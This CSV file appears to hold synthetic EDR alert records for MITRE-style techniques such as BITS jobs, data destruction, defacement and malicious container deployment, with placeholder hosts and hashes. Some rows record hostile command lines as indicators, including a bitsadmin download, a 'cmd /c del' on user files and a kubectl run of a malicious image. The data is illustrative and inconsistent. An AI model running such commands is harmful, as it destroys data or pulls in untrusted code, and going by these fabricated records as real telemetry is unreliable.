event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
12345,threat_detection,1646749633000,Access Token Manipulation Detected,Access Token Manipulation has been detected on endpoint.,High,2023-03-10T12:00:00Z,Endpoint Detection and Response,Access Token Manipulation (T1134),"{'hostname': 'endpoint1', 'ip': '192.168.1.100', 'os': 'Windows 10 Pro', 'user': 'JohnDoe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-24680,DetectionSummaryEvent,1646749633000,Account Manipulation,User account 'jdoe' was added to the local 'Administrators' group on host DC-1,,,,,,High,"[{'host_name': 'DC-1', 'ip_address': '192.168.1.10'}]","{'username': 'admin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.11', 'affected_user': 'jdoe', 'affected_group': 'Administrators', 'modification_type': 'Addition'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Application Layer Protocol,1646749633000,Application Layer Protocol,,high,,,,,,,,network-connect,A network connection was made using an application layer protocol that is commonly associated with malware or other suspicious activity.,123456,Application Layer Protocol,192.168.1.100,1234,HTTPS,user1,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
98765,BITS Job Execution Detected,2023-03-10T10:30:00Z,BITS job execution,BITS job execution was detected on the endpoint.,high,,,,,,,,,,,,,,,,,BITS Jobs,hostname,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job /download /priority normal http://example.com/file.txt C:\file.txt,explorer.exe,C:\Windows\explorer.exe,File system monitoring and behavioral analysis,"['Terminate the process and remove any associated artifacts.', 'Investigate the source and destination of the BITS job.', 'Check for other suspicious activity on the endpoint and the network.', 'Update endpoint security software and monitor for any further activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Threat Detection,1646749655000,Suspicious data manipulation,Suspicious data manipulation activity or Data Destruction detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': 'example-user', 'timestamp_utc': '2022-03-07T16:57:35.000Z', 'attack_name': 'Data Destruction', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was destroyed'}, {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was destroyed'}, {'indicator_type': 'command_line', 'indicator_value': 'cmd /c del C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data destruction'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lodfldpw,threat detection,2023-03-08T09:00:00Z,Data Encoding Detected,Data encoding has been detected on a system,high,,,,,,,"{'process_name': 'notepad.exe', 'process_path': 'C:\\Windows\\system32\\notepad.exe', 'command_line': 'notepad.exe C:\\Users\\User1\\Desktop\\encoded.txt', 'parent_process_name': 'explorer.exe', 'parent_process_path': 'C:\\Windows\\explorer.exe', 'encoding_type': 'Base64', 'encoded_data': 'SGVsbG8gV29ybGQh'}",,,,,,,,,,,,,,,,,,,,,Data Encoding Detected,"{'hostname': 'Endpoint1', 'ip_address': '192.168.1.10', 'mac_address': '00-0C-29-56-A7-34', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646873400000,Data Manipulation,Data Manipulation detected on endpoint,,,,,,medium,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': '', 'timestamp_utc': '2022-03-09T09:30:00.000Z', 'attack_name': 'Data Manipulation', 'threat_score': 70, 'threat_indicators': [{'indicator_type': 'process_name', 'indicator_value': 'C:\\Program Files\\example-app\\example-app.exe', 'indicator_description': 'Process responsible for the suspicious data manipulation activity'}, {'indicator_type': 'file_path', 'indicator_value': 'C:\\Windows\\Temp\\example-file.txt', 'indicator_description': 'File modified by the suspicious data manipulation activity'}], 'sensor_id': '1234', 'sensor_version': '5.38.0.0', 'product_name': 'Falcon Agent', 'product_version': '5.38.0.0', 'event_source': 'EDR', 'event_source_id': '5678', 'event_type_id': '200001', 'event_type': 'DetectionSummaryEvent'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02030tr0f,detect,2022-03-15T10:30:00Z,defacement detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,"[{'severity': 'high', 'event_id': '123456', 'detect_description': 'Potential website defacement detected', 'detect_name': 'Website Defacement Detected', 'detect_id': 'T1491', 'hostname': 'example-device', 'os': 'Windows', 'os_version': '10.0.19042', 'process_name': 'iexplore.exe', 'command_line': 'iexplore.exe https://example.com/', 'process_id': '1234', 'parent_process_name': 'explorer.exe', 'parent_command_line': 'explorer.exe', 'event_timestamp': '2022-03-15T10:30:00Z', 'file_path': 'C:\\inetpub\\wwwroot\\index.html', 'attack_vector': 'Web'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2040fjh2,alert,2023-03-10T15:00:00.000Z,Deobfuscate/Decode Files or Information,Deobfuscation or decoding activity has been detected on the endpoint.,Medium,,,,"{'hostname': 'example-hostname', 'ip_address': '192.0.2.1', 'mac_address': '00:11:22:33:44:55', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,2.0,,,,,Deobfuscate/Decode Files or Information,Investigate the endpoint for any signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,Detect,2022-04-01T13:15:30Z,suspicous container,Suspicious container deployment detected,High,,,,,,,,,,,,,,,,kubectl.exe,,,,,,,,,,,,,,,,,ContainerDeploy,malicious-container,malicious-image,sha256:abcdef123456,malicious-registry.com,kubectl run malicious-container --image=malicious-image,192.168.1.100,10.10.10.10,C:\Windows\System32\kubectl.exe,admin,"{'detection_id': 'Detection-123', 'detection_time': '2022-04-01T13:18:30Z', 'detection_category': 'Exploit', 'detection_name': 'Container Deployment', 'detection_description': 'Detection of a container deployment using an exploit'}","{'type': 'Unknown', 'name': 'Unknown'}","{'hostname': 'computer-123', 'os_version': 'Windows 10 Pro 21H1', 'os_type': 'Windows', 'ip_addresses': ['192.168.1.100', 'fe80::d5a3:9c9f:2189:e591'], 'mac_addresses': ['00:0c:29:aa:bb:cc'], 'domain': 'mycompany.local'}",https://falcon.crowdstrike.com/sensors/entities/incidents/incident-details?incidentId=1234567890,abc123def456ghi789jkl012mno345pqr678stu9v,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
